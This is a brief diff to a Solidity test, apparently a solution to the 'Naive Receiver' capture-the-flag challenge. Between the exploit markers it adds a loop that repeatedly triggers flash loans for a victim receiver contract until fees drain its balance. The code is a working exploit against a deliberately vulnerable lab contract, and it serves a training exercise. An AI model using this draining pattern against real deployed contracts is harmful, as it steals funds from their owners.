@@ -48,7 +48,10 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        // 1. esgotar o saldo do contrato FlashLoanReceiver, podemos usar fees
+        while (address(flashLoanReceiver).balance > 0) {
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
+        }
         /**
          * EXPLOIT END *
          */
